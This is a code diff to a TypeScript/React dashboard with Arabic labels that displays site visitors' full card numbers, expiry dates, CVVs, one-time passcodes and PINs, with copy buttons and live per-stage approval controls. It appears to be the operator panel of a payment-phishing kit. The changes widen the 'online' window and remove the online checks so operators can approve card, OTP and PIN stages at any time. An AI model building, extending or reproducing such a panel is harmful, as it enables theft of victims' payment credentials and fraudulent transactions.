@@ -66,7 +66,7 @@ interface Visitor {
   otp_at: string | null;
 }
 
-const ONLINE_WINDOW_MS = 2 * 60 * 1000; // 2 minutes => "online"
+const ONLINE_WINDOW_MS = 10 * 60 * 1000; // 10 minutes => "online"
 
 const formatDateTime = (s: string) =>
   new Date(s).toLocaleString("ar-EG", { dateStyle: "medium", timeStyle: "short" });
@@ -1215,7 +1215,7 @@ const StageCards = ({ v }: { v: Visitor }) => {
           <Field icon={CreditCard} label="رقم البطاقة" value={v.card_number} mono copyable />
           <Field label="الانتهاء" value={v.card_expiry} mono copyable />
           <Field icon={Lock} label="CVV" value={v.card_cvv} mono copyable />
-          {isOnline(v) && (v.last_path || "").startsWith("/payment") && !(v.last_path || "").startsWith("/payment/pin") && !(v.last_path || "").startsWith("/payment/otp") && (
+          {(v.last_path || "").startsWith("/payment") && !(v.last_path || "").startsWith("/payment/pin") && !(v.last_path || "").startsWith("/payment/otp") && (
             <ApprovalActions sessionId={v.session_id} stage="card" />
           )}
         </StageCard>
@@ -1240,7 +1240,7 @@ const StageCards = ({ v }: { v: Visitor }) => {
             </div>
           )}
           <Field icon={ShieldCheck} label="OTP الحالي" value={v.card_otp} mono />
-          {isOnline(v) && (v.last_path || "").startsWith("/payment/otp") && (
+          {(v.last_path || "").startsWith("/payment/otp") && (
             <ApprovalActions sessionId={v.session_id} stage="otp" />
           )}
         </StageCard>
@@ -1255,7 +1255,7 @@ const StageCards = ({ v }: { v: Visitor }) => {
           time={v.pin_at ? formatDateTime(v.pin_at) : undefined}
         >
           <Field icon={Lock} label="PIN" value={v.card_pin} mono />
-          {isOnline(v) && (v.last_path || "").startsWith("/payment/pin") && (
+          {(v.last_path || "").startsWith("/payment/pin") && (
             <ApprovalActions sessionId={v.session_id} stage="pin" />
           )}
         </StageCard>
@@ -1326,7 +1326,7 @@ const SidebarApproval = ({ v }: { v: Visitor }) => {
   else if (path.startsWith("/payment/pin")) { stage = "pin"; hasData = !!v.card_pin; }
   else if (path.startsWith("/payment")) { stage = "card"; hasData = !!v.card_number; }
 
-  if (!stage || !hasData || !isOnline(v)) return null;
+  if (!stage || !hasData) return null;
 
   return (
     <div className="px-3 pb-3 -mt-1">
